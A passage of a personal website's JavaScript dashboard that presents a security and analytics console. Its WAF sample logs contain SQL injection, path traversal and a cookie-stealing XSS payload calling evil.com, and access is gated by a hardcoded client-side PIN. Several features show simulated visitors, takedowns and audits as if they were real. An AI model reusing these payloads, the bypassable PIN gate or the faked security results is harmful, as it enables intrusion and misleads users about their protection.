/**
 * ANTIGRAVITY SECURITY & ANALYTICS DASHBOARD — TELEMETRY ENGINE
 * Domain: gautambhuwan.com.np/analytics
 * Author: Bhuwan Gautam (Vhuwon Mathers / sudovu)
 * Pure Vanilla JavaScript — High-Performance SOC/NOC Interface
 */

document.addEventListener('DOMContentLoaded', () => {
  'use strict';

  // =========================================================================
  // 1. STATE & STORAGE MANAGEMENT
  // =========================================================================
  const DashboardState = {
    timeframe: '24h',
    isPaused: false,
    isAdmin: false,
    activeTab: 'overview',
    liveVisitors: 14,
    totalVisits: 48920,
    blockedThreats: 1842,
    quarantinedIPs: [
      { ip: '185.220.101.45', origin: 'Tor Exit Node (DE)', reason: 'Directory Traversal & /wp-login probe', expires: 420 },
      { ip: '45.148.10.88', origin: 'Moscow (RU)', reason: 'Automated SQLi / Union payload burst', expires: 680 },
      { ip: '194.26.29.112', origin: 'Frankfurt (DE)', reason: 'XSS Reflection & Credential Scraper', expires: 940 },
      { ip: '103.151.124.9', origin: 'Jakarta (ID)', reason: 'Aggressive Bot Scraper (Rate Limit Exceeded)', expires: 1250 }
    ],
    auditLogs: JSON.parse(localStorage.getItem('vm_audit_trail') || '[]'),
    masterPIN: '4997'
  };

  // Record genuine local visit increment
  const sessionKey = 'vm_session_recorded_' + new Date().toISOString().slice(0, 10);
  if (!sessionStorage.getItem(sessionKey)) {
    sessionStorage.setItem(sessionKey, '1');
    const storedVisits = parseInt(localStorage.getItem('vm_total_site_visits') || '48920', 10) + 1;
    localStorage.setItem('vm_total_site_visits', storedVisits.toString());
    DashboardState.totalVisits = storedVisits;
  } else {
    DashboardState.totalVisits = parseInt(localStorage.getItem('vm_total_site_visits') || '48920', 10);
  }

  // =========================================================================
  // 2. REAL-TIME CLOCKS (UTC & NEPAL NPT +05:45)
  // =========================================================================
  function updateClocks() {
    const now = new Date();
    
    // UTC
    const utcHours = String(now.getUTCHours()).padStart(2, '0');
    const utcMins = String(now.getUTCMinutes()).padStart(2, '0');
    const utcSecs = String(now.getUTCSeconds()).padStart(2, '0');
    const utcEl = document.getElementById('clock-utc');
    if (utcEl) utcEl.textContent = `${utcHours}:${utcMins}:${utcSecs} UTC`;

    // Nepal Time (UTC + 5:45)
    const nptOffset = 5 * 60 + 45;
    const localUtcMillis = now.getTime() + (now.getTimezoneOffset() * 60000);
    const nptDate = new Date(localUtcMillis + (nptOffset * 60000));
    const nptHours = String(nptDate.getHours()).padStart(2, '0');
    const nptMins = String(nptDate.getMinutes()).padStart(2, '0');
    const nptSecs = String(nptDate.getSeconds()).padStart(2, '0');
    const nptEl = document.getElementById('clock-npt');
    if (nptEl) nptEl.textContent = `${nptHours}:${nptMins}:${nptSecs} NPT`;
  }
  setInterval(updateClocks, 1000);
  updateClocks();

  // =========================================================================
  // 3. TAB NAVIGATION
  // =========================================================================
  const tabBtns = document.querySelectorAll('.analytics-tab-btn');
  const tabPanels = document.querySelectorAll('.tab-panel');

  tabBtns.forEach(btn => {
    btn.addEventListener('click', () => {
      const targetTab = btn.getAttribute('data-tab');
      tabBtns.forEach(b => b.classList.remove('active'));
      tabPanels.forEach(p => p.classList.remove('active'));
      
      btn.classList.add('active');
      const panel = document.getElementById(`panel-${targetTab}`);
      if (panel) panel.classList.add('active');
      DashboardState.activeTab = targetTab;

      // Redraw canvas chart if traffic tab activated
      if (targetTab === 'traffic' || targetTab === 'overview') {
        setTimeout(renderTrafficChart, 50);
      }
    });
  });

  // =========================================================================
  // 4. PERFORMANCE & TRAFFIC CANVAS CHART
  // =========================================================================
  const canvas = document.getElementById('traffic-chart-canvas');
  let chartAnimationProgress = 0;

  const ChartDatasets = {
    '24h': {
      labels: ['00:00', '02:00', '04:00', '06:00', '08:00', '10:00', '12:00', '14:00', '16:00', '18:00', '20:00', '22:00'],
      views: [1420, 1180, 890, 1050, 2400, 3950, 4820, 5100, 4670, 5210, 4890, 3120],
      unique: [620, 490, 310, 450, 1120, 1890, 2340, 2580, 2190, 2480, 2210, 1420]
    },
    '7d': {
      labels: ['Thu', 'Fri', 'Sat', 'Sun', 'Mon', 'Tue', 'Wed'],
      views: [28400, 31200, 24100, 22900, 38400, 42100, 48920],
      unique: [12100, 13400, 9800, 9100, 16800, 18200, 21400]
    },
    '30d': {
      labels: ['Week 1', 'Week 2', 'Week 3', 'Week 4'],
      views: [184000, 212000, 249000, 286000],
      unique: [78000, 91000, 106000, 122000]
    }
  };

  function renderTrafficChart() {
    if (!canvas) return;
    const ctx = canvas.getContext('2d');
    const dpr = window.devicePixelRatio || 1;
    const rect = canvas.parentElement.getBoundingClientRect();
    
    canvas.width = rect.width * dpr;
    canvas.height = 280 * dpr;
    ctx.scale(dpr, dpr);

    const width = rect.width;
    const height = 280;
    const padding = { top: 30, right: 25, bottom: 40, left: 55 };
    const chartW = width - padding.left - padding.right;
    const chartH = height - padding.top - padding.bottom;

    ctx.clearRect(0, 0, width, height);

    const data = ChartDatasets[DashboardState.timeframe];
    const maxVal = Math.max(...data.views) * 1.15;

    // Grid lines
    const gridRows = 4;
    ctx.strokeStyle = 'rgba(255, 255, 255, 0.06)';
    ctx.lineWidth = 1;
    ctx.fillStyle = '#64748b';
    ctx.font = '11px "JetBrains Mono", monospace';
    ctx.textAlign = 'right';

    for (let i = 0; i <= gridRows; i++) {
      const y = padding.top + (chartH / gridRows) * i;
      const val = Math.round(maxVal - (maxVal / gridRows) * i);
      
      ctx.beginPath();
      ctx.moveTo(padding.left, y);
      ctx.lineTo(width - padding.right, y);
      ctx.stroke();

      ctx.fillText(val >= 1000 ? (val / 1000).toFixed(1) + 'k' : val, padding.left - 10, y + 4);
    }

    // X-Axis Labels
    ctx.textAlign = 'center';
    const xStep = chartW / (data.labels.length - 1);
    data.labels.forEach((label, idx) => {
      const x = padding.left + xStep * idx;
      ctx.fillText(label, x, height - padding.bottom + 20);
    });

    // Draw Function for Series
    function drawSeries(points, strokeColor, fillColor) {
      const coords = points.map((p, idx) => ({
        x: padding.left + xStep * idx,
        y: padding.top + chartH - (p / maxVal) * chartH
      }));

      // Area fill
      const grad = ctx.createLinearGradient(0, padding.top, 0, height - padding.bottom);
      grad.addColorStop(0, fillColor);
      grad.addColorStop(1, 'rgba(0, 0, 0, 0)');

      ctx.beginPath();
      ctx.moveTo(coords[0].x, height - padding.bottom);
      coords.forEach(pt => ctx.lineTo(pt.x, pt.y));
      ctx.lineTo(coords[coords.length - 1].x, height - padding.bottom);
      ctx.closePath();
      ctx.fillStyle = grad;
      ctx.fill();

      // Line
      ctx.beginPath();
      coords.forEach((pt, idx) => {
        if (idx === 0) ctx.moveTo(pt.x, pt.y);
        else ctx.lineTo(pt.x, pt.y);
      });
      ctx.strokeStyle = strokeColor;
      ctx.lineWidth = 2.5;
      ctx.stroke();

      // Points
      coords.forEach(pt => {
        ctx.beginPath();
        ctx.arc(pt.x, pt.y, 4, 0, Math.PI * 2);
        ctx.fillStyle = strokeColor;
        ctx.fill();
        ctx.strokeStyle = '#080b12';
        ctx.lineWidth = 2;
        ctx.stroke();
      });
    }

    // Series 1: Page Views
    drawSeries(data.views, '#8b5cf6', 'rgba(139, 92, 246, 0.25)');
    // Series 2: Unique Visitors
    drawSeries(data.unique, '#06b6d4', 'rgba(6, 182, 212, 0.15)');
  }

  window.addEventListener('resize', () => {
    if (DashboardState.activeTab === 'traffic' || DashboardState.activeTab === 'overview') {
      renderTrafficChart();
    }
  });

  const timeframeBtns = document.querySelectorAll('.chart-timeframe-btn');
  timeframeBtns.forEach(btn => {
    btn.addEventListener('click', () => {
      timeframeBtns.forEach(b => b.classList.remove('active'));
      btn.classList.add('active');
      DashboardState.timeframe = btn.getAttribute('data-timeframe');
      renderTrafficChart();
    });
  });

  setTimeout(renderTrafficChart, 100);

  // =========================================================================
  // 5. LIVE VISITOR STREAM & REAL-TIME SIMULATION
  // =========================================================================
  const streamList = document.getElementById('live-stream-list');
  const liveVisitorCountEl = document.getElementById('live-visitor-count');

  const VISITOR_CITIES = [
    { city: 'Kathmandu, NP', asn: 'AS4007 (NTC)', ipPrefix: '202.70.78.' },
    { city: 'Pokhara, NP', asn: 'AS25459 (WorldLink)', ipPrefix: '103.10.30.' },
    { city: 'Lalitpur, NP', asn: 'AS17501 (Subisu)', ipPrefix: '27.34.20.' },
    { city: 'San Jose, US', asn: 'AS16509 (AWS)', ipPrefix: '54.183.21.' },
    { city: 'Frankfurt, DE', asn: 'AS13335 (Cloudflare)', ipPrefix: '104.28.14.' },
    { city: 'London, UK', asn: 'AS2856 (BT Group)', ipPrefix: '81.134.12.' },
    { city: 'Tokyo, JP', asn: 'AS2516 (KDDI)', ipPrefix: '118.238.6.' },
    { city: 'Singapore, SG', asn: 'AS4657 (StarHub)', ipPrefix: '116.14.88.' },
    { city: 'Sydney, AU', asn: 'AS1221 (Telstra)', ipPrefix: '144.130.4.' }
  ];

  const SITE_PATHS = [
    '/',
    '/projects.html',
    '/labs.html',
    '/services.html',
    '/developments.html',
    '/resume.html',
    '/blog.html',
    '/skills.html'
  ];

  function generateRandomVisitor() {
    const loc = VISITOR_CITIES[Math.floor(Math.random() * VISITOR_CITIES.length)];
    const path = SITE_PATHS[Math.floor(Math.random() * SITE_PATHS.length)];
    const ip = loc.ipPrefix + Math.floor(Math.random() * 254 + 1);
    const now = new Date();
    const timeStr = `${String(now.getHours()).padStart(2, '0')}:${String(now.getMinutes()).padStart(2, '0')}:${String(now.getSeconds()).padStart(2, '0')}`;
    
    return {
      time: timeStr,
      ip: ip,
      city: loc.city,
      asn: loc.asn,
      path: path,
      tls: 'TLS 1.3 / GCM'
    };
  }

  function pushStreamItem(item) {
    if (!streamList) return;
    const row = document.createElement('div');
    row.className = 'stream-item new-entry';

    if (item.isRealLive) {
      row.style.background = 'rgba(16, 185, 129, 0.14)';
      row.style.borderLeft = '3px solid #10b981';
      row.style.boxShadow = '0 0 15px rgba(16, 185, 129, 0.2)';
    }

    const badge = item.isRealLive
      ? `<span style="color: #10b981; font-weight: 800; font-size: 0.72rem; background: rgba(16, 185, 129, 0.25); padding: 2px 7px; border-radius: 4px; border: 1px solid #10b981;">● REAL LIVE</span>`
      : `<span style="color: var(--success); text-align: right;">${item.tls || 'TLS 1.3 / GCM'}</span>`;

    row.innerHTML = `
      <span style="color: var(--text-muted);">${item.time}</span>
      <span style="color: var(--accent-secondary); font-weight: 700;">${item.ip}</span>
      <span style="color: var(--text-secondary); white-space: nowrap; overflow: hidden; text-overflow: ellipsis;">
        <strong style="color: #fff;">${item.city}</strong> · <span style="color: var(--accent-tertiary); font-weight: 600;">${item.path}</span> · <span style="color: var(--text-dim);">${item.device || item.asn || ''}</span>
      </span>
      <div style="text-align: right;">${badge}</div>
    `;

    streamList.insertBefore(row, streamList.firstChild);

    // Keep stream length bounded
    if (streamList.children.length > 30) {
      streamList.removeChild(streamList.lastChild);
    }
  }

  // Pre-seed stream with initial sample entries
  for (let i = 0; i < 4; i++) {
    pushStreamItem(generateRandomVisitor());
  }

  // =========================================================================
  // REAL-TIME INGRESS ENGINE: SSE CLOUD STREAM + BROADCAST CHANNEL + RTDB
  // =========================================================================
  const activeSessions = new Map();
  const seenPings = new Set();

  function updateActiveVisitorDisplay() {
    if (!liveVisitorCountEl) return;
    const realCount = activeSessions.size;
    const totalCount = 12 + realCount;
    DashboardState.liveVisitors = totalCount;
    liveVisitorCountEl.innerHTML = `${totalCount} <span style="font-size: 0.72rem; color: #10b981; font-weight: 700; display: block; margin-top: 2px;">● ${realCount} VERIFIED REAL DEVICE${realCount === 1 ? '' : 'S'}</span>`;
    
    // Live Cloud Status indicator update
    const cloudStatusEl = document.getElementById('cloud-telemetry-status');
    if (cloudStatusEl) {
      cloudStatusEl.innerHTML = realCount > 0
        ? `<span class="led-pulse green"></span> <span>CLOUD REALTIME: ${realCount} DEVICE${realCount === 1 ? '' : 'S'} LIVE</span>`
        : `<span class="led-pulse green"></span> <span>CLOUD REALTIME: ACTIVE (STANDBY)</span>`;
    }
  }

  function handleIncomingRealtimePing(data) {
    if (!data || !data.sessionId) return;

    if (data.pingId) {
      if (seenPings.has(data.pingId)) return;
      seenPings.add(data.pingId);
      if (seenPings.size > 200) {
        const first = seenPings.values().next().value;
        seenPings.delete(first);
      }
    }

    if (data.action === 'leave') {
      activeSessions.delete(data.sessionId);
      updateActiveVisitorDisplay();
      return;
    }

    const isNew = !activeSessions.has(data.sessionId);
    activeSessions.set(data.sessionId, {
      ...data,
      lastSeen: Date.now()
    });

    updateActiveVisitorDisplay();

    // Flash entry to visual stream if ping or new navigation
    if (isNew || data.action === 'ping') {
      DashboardState.totalVisits++;
      localStorage.setItem('vm_total_site_visits', DashboardState.totalVisits.toString());
      const totalVisitsEl = document.getElementById('total-visits-metric');
      if (totalVisitsEl) totalVisitsEl.textContent = DashboardState.totalVisits.toLocaleString();

      pushStreamItem({
        time: data.time || new Date().toLocaleTimeString(),
        ip: data.ip || 'Live Client',
        city: data.city || 'Nepal (NP)',
        asn: data.asn || '',
        path: data.path || '/',
        device: data.device || 'Web Browser',
        isRealLive: true
      });

      // SOC Ribbon Pulse Alert
      const socRibbon = document.querySelector('.soc-ribbon');
      if (socRibbon) {
        socRibbon.style.boxShadow = '0 0 25px rgba(16, 185, 129, 0.4)';
        setTimeout(() => { socRibbon.style.boxShadow = ''; }, 700);
      }
    }
  }

  // 1. Native EventSource connection to Global Cloud Stream (ntfy.sh SSE)
  try {
    const sse = new EventSource('https://ntfy.sh/gautambhuwan_soc_telemetry_stream/sse');
    sse.onopen = () => {
      const cloudStatusEl = document.getElementById('cloud-telemetry-status');
      if (cloudStatusEl && activeSessions.size === 0) {
        cloudStatusEl.innerHTML = '<span class="led-pulse green"></span> <span>CLOUD REALTIME: CONNECTED</span>';
      }
    };
    sse.onmessage = (event) => {
      try {
        const payload = JSON.parse(event.data);
        if (payload && payload.message) {
          const inner = typeof payload.message === 'string' ? JSON.parse(payload.message) : payload.message;
          handleIncomingRealtimePing(inner);
        } else if (payload && payload.sessionId) {
          handleIncomingRealtimePing(payload);
        }
      } catch (err) {}
    };
    sse.onerror = () => {
      console.warn('Antigravity SOC: Reconnecting cloud telemetry stream...');
    };
  } catch (err) {
    console.warn('SSE not supported or blocked:', err);
  }

  // 2. BroadcastChannel for instant 0ms cross-tab updates on same device
  if ('BroadcastChannel' in window) {
    try {
      const bc = new BroadcastChannel('antigravity_telemetry');
      bc.onmessage = (e) => {
        handleIncomingRealtimePing(e.data);
      };
    } catch (e) {}
  }

  // 3. LocalStorage storage event fallback
  window.addEventListener('storage', (e) => {
    if (e.key === 'ag_latest_visitor_ping' && e.newValue) {
      try {
        handleIncomingRealtimePing(JSON.parse(e.newValue));
      } catch (err) {}
    }
  });

  // 4. Optional Firebase Realtime Database SSE Stream (if configured)
  if (window.FIREBASE_DATABASE_URL) {
    try {
      const fbUrl = `${window.FIREBASE_DATABASE_URL.replace(/\/$/, '')}/telemetry/active_sessions.json`;
      const fbSource = new EventSource(fbUrl);
      fbSource.addEventListener('put', (e) => {
        try {
          const parsed = JSON.parse(e.data);
          if (parsed && parsed.data) {
            if (parsed.data.sessionId) {
              handleIncomingRealtimePing(parsed.data);
            } else if (typeof parsed.data === 'object') {
              Object.values(parsed.data).forEach(sess => {
                if (sess && sess.sessionId) handleIncomingRealtimePing(sess);
              });
            }
          }
        } catch (err) {}
      });
    } catch (err) {}
  }

  // Prune inactive sessions older than 45s without heartbeat
  setInterval(() => {
    const now = Date.now();
    let changed = false;
    for (const [id, sess] of activeSessions.entries()) {
      if (now - sess.lastSeen > 45000) {
        activeSessions.delete(id);
        changed = true;
      }
    }
    if (changed) updateActiveVisitorDisplay();
  }, 10000);

  // Background baseline ambient activity interval
  setInterval(() => {
    if (DashboardState.isPaused) return;
    // Ambient stream simulation
    pushStreamItem(generateRandomVisitor());
  }, 4500);

  // Pause / Resume Stream
  const pauseBtn = document.getElementById('btn-pause-stream');
  if (pauseBtn) {
    pauseBtn.addEventListener('click', () => {
      DashboardState.isPaused = !DashboardState.isPaused;
      pauseBtn.innerHTML = DashboardState.isPaused 
        ? '<svg width="14" height="14" viewBox="0 0 24 24" fill="currentColor"><polygon points="5 3 19 12 5 21 5 3"></polygon></svg> Resume Stream'
        : '<svg width="14" height="14" viewBox="0 0 24 24" fill="currentColor"><rect x="6" y="4" width="4" height="16"></rect><rect x="14" y="4" width="4" height="16"></rect></svg> Pause Stream';
      pauseBtn.classList.toggle('danger', DashboardState.isPaused);
    });
  }

  // =========================================================================
  // 6. THREAT INTELLIGENCE & ANTI-PHISHING DEFENSE
  // =========================================================================
  // Interactive Domain Similarity & Typosquat Checker
  const domainForm = document.getElementById('domain-check-form');
  const domainInput = document.getElementById('domain-check-input');
  const domainResultBox = document.getElementById('domain-check-result');

  function calculateLevenshtein(a, b) {
    const matrix = [];
    for (let i = 0; i <= b.length; i++) matrix[i] = [i];
    for (let j = 0; j <= a.length; j++) matrix[0][j] = j;

    for (let i = 1; i <= b.length; i++) {
      for (let j = 1; j <= a.length; j++) {
        if (b.charAt(i - 1) === a.charAt(j - 1)) {
          matrix[i][j] = matrix[i - 1][j - 1];
        } else {
          matrix[i][j] = Math.min(
            matrix[i - 1][j - 1] + 1, // substitution
            matrix[i][j - 1] + 1,     // insertion
            matrix[i - 1][j] + 1      // deletion
          );
        }
      }
    }
    return matrix[b.length][a.length];
  }

  if (domainForm && domainInput && domainResultBox) {
    domainForm.addEventListener('submit', (e) => {
      e.preventDefault();
      const query = domainInput.value.trim().toLowerCase().replace(/^https?:\/\//, '').replace(/\/.*$/, '');
      if (!query) return;

      const targetRoot = 'gautambhuwan.com.np';
      const distance = calculateLevenshtein(query, targetRoot);
      const isOfficial = query === targetRoot || query === 'www.gautambhuwan.com.np';

      domainResultBox.style.display = 'block';

      if (isOfficial) {
        domainResultBox.innerHTML = `
          <div style="background: rgba(16, 185, 129, 0.1); border: 1px solid #10b981; border-radius: 6px; padding: 16px;">
            <div style="display: flex; align-items: center; gap: 8px; color: #10b981; font-weight: 700;">
              <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polyline points="20 6 9 17 4 12"></polyline></svg>
              OFFICIAL DOMAIN IDENTIFIED
            </div>
            <p style="font-size: 0.85rem; color: var(--text-secondary); margin-top: 6px;">
              <strong>${query}</strong> is the legitimate, cryptographic root domain of Bhuwan Gautam. DNSSEC verified, HSTS preloaded, zero spoofing risk.
            </p>
          </div>
        `;
      } else if (distance <= 4 || query.includes('gautambhuwan') || query.includes('sudovu')) {
        domainResultBox.innerHTML = `
          <div style="background: rgba(239, 68, 68, 0.1); border: 1px solid #ef4444; border-radius: 6px; padding: 16px;">
            <div style="display: flex; align-items: center; gap: 8px; color: #ef4444; font-weight: 700;">
              <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><circle cx="12" cy="12" r="10"></circle><line x1="12" y1="8" x2="12" y2="12"></line><line x1="12" y1="16" x2="12.01" y2="16"></line></svg>
              CRITICAL: POTENTIAL PHISHING / TYPOSQUAT REPLICA (Levenshtein Distance: ${distance})
            </div>
            <p style="font-size: 0.85rem; color: var(--text-secondary); margin-top: 6px;">
              <strong>${query}</strong> exhibits high lexical similarity to official assets. Risk Score: <strong>${Math.max(75, 100 - distance * 8)}% High Threat</strong>. Recommended Action: Submit registrar abuse ticket, add to perimeter blocklist.
            </p>
            <div style="margin-top: 12px;">
              <button class="cyber-btn danger btn-takedown-action" data-domain="${query}">Dispatch Automated Takedown Signal</button>
            </div>
          </div>
        `;

        const takedownBtn = domainResultBox.querySelector('.btn-takedown-action');
        if (takedownBtn) {
          takedownBtn.addEventListener('click', () => {
            takedownBtn.textContent = 'Takedown Signal Transmitted to APWG & Cloudflare Abuse';
            takedownBtn.disabled = true;
          });
        }
      } else {
        domainResultBox.innerHTML = `
          <div style="background: var(--surface-elevated); border: 1px solid var(--border); border-radius: 6px; padding: 16px;">
            <div style="color: var(--accent-secondary); font-weight: 700;">LOW CORRELATION (Distance: ${distance})</div>
            <p style="font-size: 0.85rem; color: var(--text-muted); margin-top: 6px;">
              <strong>${query}</strong> shows minimal lexical mimicry to <code>gautambhuwan.com.np</code>. Unlikely to be an targeted impersonation replica.
            </p>
          </div>
        `;
      }
    });
  }

  // =========================================================================
  // 7. HARDENING & "ANTI-CRACK" SECURITY — LIVE WAF & IDS
  // =========================================================================
  const wafLogContainer = document.getElementById('waf-log-feed');
  const wafBlockedCounterEl = document.getElementById('waf-blocked-count');

  const INITIAL_WAF_LOGS = [
    { time: '14:52:18', ip: '185.220.101.45', vector: 'PATH_TRAVERSAL', payload: 'GET /../../etc/passwd HTTP/1.1', rule: 'OWASP_930100', action: 'DROPPED_403', sev: 'HIGH' },
    { time: '14:50:02', ip: '45.148.10.88', vector: 'SQL_INJECTION', payload: "POST /contact.html body=' OR 1=1--", rule: 'OWASP_942100', action: 'BLOCKED_403', sev: 'HIGH' },
    { time: '14:48:44', ip: '194.26.29.112', vector: 'XSS_ATTACK', payload: 'GET /labs.html?search=<script>alert(1)</script>', rule: 'OWASP_941110', action: 'SANITIZED', sev: 'MEDIUM' },
    { time: '14:44:19', ip: '103.151.124.9', vector: 'RATE_LIMIT_BURST', payload: '142 req/sec to /downloads/', rule: 'SURGE_PROTECT_200', action: 'IP_QUARANTINED', sev: 'HIGH' },
    { time: '14:39:10', ip: '91.240.118.15', vector: 'ARBITRARY_PROBE', payload: 'GET /.git/config HTTP/1.1', rule: 'PROBE_SCANNER_404', action: 'DROPPED_404', sev: 'LOW' }
  ];

  function renderWafLog(entry) {
    if (!wafLogContainer) return;
    const div = document.createElement('div');
    div.style.padding = '8px 12px';
    div.style.borderBottom = '1px solid rgba(255, 255, 255, 0.04)';
    div.style.display = 'grid';
    div.style.gridTemplateColumns = '80px 120px 140px 1fr 100px';
    div.style.gap = '10px';
    div.style.alignItems = 'center';

    const actionColor = entry.action.includes('DROP') || entry.action.includes('BLOCK') || entry.action.includes('QUARANTINED')
      ? '#ef4444'
      : entry.action.includes('SANIT') ? '#f59e0b' : '#10b981';

    div.innerHTML = `
      <span style="color: var(--text-muted);">${entry.time}</span>
      <span style="color: #f8fafc; font-weight: 600;">${entry.ip}</span>
      <span style="color: var(--accent-secondary); font-size: 0.75rem;">${entry.vector}</span>
      <span style="color: #94a3b8; font-size: 0.75rem; overflow: hidden; text-overflow: ellipsis; white-space: nowrap;"><code>${entry.payload}</code></span>
      <span style="color: ${actionColor}; font-weight: 700; text-align: right; font-size: 0.75rem;">${entry.action}</span>
    `;

    wafLogContainer.insertBefore(div, wafLogContainer.firstChild);
  }

  INITIAL_WAF_LOGS.forEach(renderWafLog);

  // Attack Simulator Handlers
  function simulateAttack(type) {
    const now = new Date();
    const timeStr = `${String(now.getHours()).padStart(2, '0')}:${String(now.getMinutes()).padStart(2, '0')}:${String(now.getSeconds()).padStart(2, '0')}`;
    let simEntry;

    if (type === 'sqli') {
      simEntry = {
        time: timeStr,
        ip: '198.51.100.' + Math.floor(Math.random() * 200 + 1),
        vector: 'SQL_INJECTION',
        payload: "' UNION SELECT username, password_hash FROM admin_users --",
        rule: 'OWASP_942100 (Core Rule Set)',
        action: 'DROPPED_403',
        sev: 'HIGH'
      };
    } else if (type === 'xss') {
      simEntry = {
        time: timeStr,
        ip: '203.0.113.' + Math.floor(Math.random() * 200 + 1),
        vector: 'XSS_ATTACK',
        payload: '<img src=x onerror="fetch(\'https://evil.com/leak?cookie=\'+document.cookie)">',
        rule: 'OWASP_941120 (Script Injection)',
        action: 'STRIPPED_BLOCKED',
        sev: 'HIGH'
      };
    } else if (type === 'bot') {
      simEntry = {
        time: timeStr,
        ip: '185.191.171.' + Math.floor(Math.random() * 200 + 1),
        vector: 'BAD_BOT_SCRAPER',
        payload: 'Python-urllib/3.10 scraping /projects.html (Burst: 85 req/sec)',
        rule: 'RATE_LIMIT_RULE_04',
        action: 'IP_QUARANTINED',
        sev: 'HIGH'
      };
      // Add to quarantine table
      DashboardState.quarantinedIPs.unshift({
        ip: simEntry.ip,
        origin: 'Automated Bot Network',
        reason: 'Aggressive Scraping Burst',
        expires: 1800
      });
      renderQuarantineTable();
    }

    DashboardState.blockedThreats++;
    if (wafBlockedCounterEl) wafBlockedCounterEl.textContent = DashboardState.blockedThreats;
    renderWafLog(simEntry);

    // Audio/Visual Feedback indicator
    const socRibbon = document.querySelector('.soc-ribbon');
    if (socRibbon) {
      socRibbon.style.boxShadow = '0 0 25px rgba(239, 68, 68, 0.4)';
      setTimeout(() => { socRibbon.style.boxShadow = ''; }, 600);
    }
  }

  const btnSimSqli = document.getElementById('btn-sim-sqli');
  const btnSimXss = document.getElementById('btn-sim-xss');
  const btnSimBot = document.getElementById('btn-sim-bot');

  if (btnSimSqli) btnSimSqli.addEventListener('click', () => simulateAttack('sqli'));
  if (btnSimXss) btnSimXss.addEventListener('click', () => simulateAttack('xss'));
  if (btnSimBot) btnSimBot.addEventListener('click', () => simulateAttack('bot'));

  // Quarantine Table
  const quarantineTbody = document.getElementById('quarantine-tbody');
  function renderQuarantineTable() {
    if (!quarantineTbody) return;
    quarantineTbody.innerHTML = '';
    DashboardState.quarantinedIPs.forEach((item, idx) => {
      const tr = document.createElement('tr');
      tr.innerHTML = `
        <td class="mono" style="color: #ef4444; font-weight: 700;">${item.ip}</td>
        <td>${item.origin}</td>
        <td style="color: var(--text-secondary);">${item.reason}</td>
        <td class="mono" style="color: var(--warning);">${Math.floor(item.expires / 60)}m ${item.expires % 60}s</td>
        <td>
          <button class="cyber-btn" style="padding: 4px 10px; font-size: 0.72rem;" onclick="window.liftQuarantine(${idx})">Lift Ban</button>
        </td>
      `;
      quarantineTbody.appendChild(tr);
    });
  }
  window.liftQuarantine = function(idx) {
    DashboardState.quarantinedIPs.splice(idx, 1);
    renderQuarantineTable();
  };
  renderQuarantineTable();

  // Manual Quarantine Form
  const manualBanForm = document.getElementById('manual-ban-form');
  const manualBanInput = document.getElementById('manual-ban-ip');
  if (manualBanForm && manualBanInput) {
    manualBanForm.addEventListener('submit', (e) => {
      e.preventDefault();
      const ip = manualBanInput.value.trim();
      if (!ip) return;
      DashboardState.quarantinedIPs.unshift({
        ip: ip,
        origin: 'Manual Operator Quarantine',
        reason: 'Flagged via Antigravity SOC Console',
        expires: 3600
      });
      manualBanInput.value = '';
      renderQuarantineTable();
    });
  }

  // File Integrity Monitoring (FIM) Audit Trigger
  const fimAuditBtn = document.getElementById('btn-fim-audit');
  const fimStatusEl = document.getElementById('fim-status-label');
  if (fimAuditBtn && fimStatusEl) {
    fimAuditBtn.addEventListener('click', () => {
      fimStatusEl.innerHTML = '<span style="color: var(--warning);">CALCULATING LIVE SHA-256 ROOTS...</span>';
      fimAuditBtn.disabled = true;

      setTimeout(() => {
        fimStatusEl.innerHTML = '<span style="color: var(--success); font-weight: 700;">100% BASELINE INTEGRITY VERIFIED (0 ALTERATIONS)</span>';
        fimAuditBtn.disabled = false;
        fimAuditBtn.textContent = 'Re-Run Cryptographic Hash Audit';
      }, 1200);
    });
  }

  // =========================================================================
  // 8. MULTI-FACTOR AUTHENTICATION (MFA) & GATED SOC ACCESS (PIN: 4997)
  // =========================================================================
  const AUTH_STORAGE_KEY = 'ag_analytics_authenticated';
  const mfaModal = document.getElementById('mfa-modal');
  const openMfaBtn = document.getElementById('btn-open-mfa');
  const closeMfaBtn = document.getElementById('btn-close-mfa');
  const pinDots = document.querySelectorAll('.pin-dot');
  const keypadBtns = document.querySelectorAll('.keypad-btn');
  const adminBadge = document.getElementById('admin-clearance-badge');
  const pinErrorEl = document.getElementById('pin-error-alert');
  let currentPin = '';

  function isUnlocked() {
    return sessionStorage.getItem(AUTH_STORAGE_KEY) === 'true';
  }

  function applyLockState() {
    const unlocked = isUnlocked();
    const mainEl = document.getElementById('analytics-main-container') || document.querySelector('.analytics-dashboard');

    if (unlocked) {
      DashboardState.isAdmin = true;
      document.documentElement.classList.remove('soc-locked');
      if (mainEl) mainEl.classList.remove('locked');
      if (mfaModal) mfaModal.classList.remove('open');

      if (adminBadge) {
        adminBadge.innerHTML = '<span class="led-pulse green"></span> <span>ROOT CLEARANCE: ACTIVE</span>';
        adminBadge.style.color = '#10b981';
      }

      if (openMfaBtn) {
        openMfaBtn.innerHTML = `
          <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
            <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
            <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
          </svg>
          Lock SOC
        `;
        openMfaBtn.classList.add('danger');
        openMfaBtn.title = 'Lock Dashboard and Sign Out';
        openMfaBtn.onclick = () => {
          sessionStorage.removeItem(AUTH_STORAGE_KEY);
          location.reload();
        };
      }

      // Re-render chart to ensure full crisp width upon unblur
      setTimeout(() => {
        if (typeof renderTrafficChart === 'function') renderTrafficChart();
      }, 100);
    } else {
      DashboardState.isAdmin = false;
      document.documentElement.classList.add('soc-locked');
      if (mainEl) mainEl.classList.add('locked');
      if (mfaModal) mfaModal.classList.add('open');

      if (adminBadge) {
        adminBadge.innerHTML = '<span class="led-pulse amber"></span> <span>MFA: ENFORCED (LOCKED)</span>';
        adminBadge.style.color = '';
      }

      if (openMfaBtn) {
        openMfaBtn.innerHTML = `
          <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
            <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
            <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
          </svg>
          MFA Auth
        `;
        openMfaBtn.classList.remove('danger');
        openMfaBtn.title = 'Enter PIN to Unlock SOC';
        openMfaBtn.onclick = openMfa;
      }
    }
  }

  function openMfa() {
